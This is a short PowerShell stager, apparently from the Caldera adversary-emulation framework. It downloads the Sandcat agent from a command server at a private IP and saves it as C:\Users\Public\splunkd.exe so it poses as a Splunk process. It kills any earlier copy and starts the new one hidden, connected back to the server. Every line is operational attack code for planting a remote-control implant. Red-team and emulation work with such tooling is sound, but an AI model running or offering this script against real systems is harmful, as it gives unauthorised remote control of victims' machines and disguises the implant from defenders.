$server="http://192.168.56.1:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);

get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Set-Location C:\Users\Public # Needed for execution via schtask (see ability id 099ea47f-fa4d-4c2e-a089-601eefecb962)
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group target" -WindowStyle hidden;